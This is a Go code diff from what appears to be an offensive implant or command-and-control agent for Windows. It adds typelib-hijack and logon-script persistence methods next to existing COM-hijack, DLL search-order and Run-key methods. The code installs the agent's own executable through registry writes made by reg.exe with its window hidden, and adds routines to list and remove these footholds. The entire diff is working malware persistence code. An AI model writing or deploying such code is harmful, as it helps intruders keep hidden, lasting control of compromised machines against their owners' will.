@@ -150,9 +150,42 @@ func applyPersistence(method string, args string) string {
 		return persistCOMHijack(args)
 	case "dll_search_order":
 		return persistDLLHijack(args)
+	case "typelib":
+		plan, err := persistenceAddPlan(method, args)
+		if err != nil {
+			return err.Error()
+		}
+		return runPersistencePlan(method, plan)
+	case "logon_script":
+		binaryPath := args
+		if binaryPath == "" {
+			p, err := os.Executable()
+			if err != nil {
+				return fmt.Sprintf("logon_script: failed to get exe path: %v", err)
+			}
+			binaryPath = p
+		}
+		plan, err := persistenceAddPlan(method, binaryPath)
+		if err != nil {
+			return err.Error()
+		}
+		return runPersistencePlan(method, plan)
 	default:
 		return fmt.Sprintf("unknown persistence method: %s", method)
 	}
+}
+
+// runPersistencePlan executes an arm of persistence_plan.go through reg.exe.
+// Every step keeps the payload path in its own argv element.
+func runPersistencePlan(method string, plan []persistenceRegCommand) string {
+	for _, step := range plan {
+		cmd := exec.Command("reg", step.Args...)
+		applyHideWindow(cmd)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			return fmt.Sprintf("%s: reg step failed: %v %s", method, err, string(out))
+		}
+	}
+	return fmt.Sprintf("%s: registry persistence added via %d reg writes -> %s", method, len(plan), plan[0].Args[2])
 }
 
 func persistRegistryRun(args string) string {
@@ -427,6 +460,26 @@ func listPersistence() string {
 		results = append(results, "[-] COM hijack CLSID: not found")
 	}
 
+	for _, method := range []string{"typelib", "logon_script"} {
+		key, value, ok := persistenceListQuery(method)
+		if !ok {
+			continue
+		}
+		out, err := regGetWindows(key)
+		found := err == nil
+		if found {
+			if value == "" {
+				found = strings.TrimSpace(out) != ""
+			} else {
+				found = strings.Contains(out, value)
+			}
+		}
+		if found {
+			results = append(results, "[+] "+method+" persistence: found")
+		} else {
+			results = append(results, "[-] "+method+" persistence: not found")
+		}
+	}
 	return strings.Join(results, "\n")
 }
 
@@ -536,6 +589,13 @@ func removePersistence(method string, args string) string {
 			return fmt.Sprintf("dll_search_order remove: failed: %v", err)
 		}
 		return "dll_search_order: removed hijack DLL"
+
+	case "typelib", "logon_script":
+		plan, err := persistenceRemovePlan(method)
+		if err != nil {
+			return err.Error()
+		}
+		return runPersistencePlan(method+" remove", plan)
 
 	default:
 		return fmt.Sprintf("unknown persistence method: %s", method)
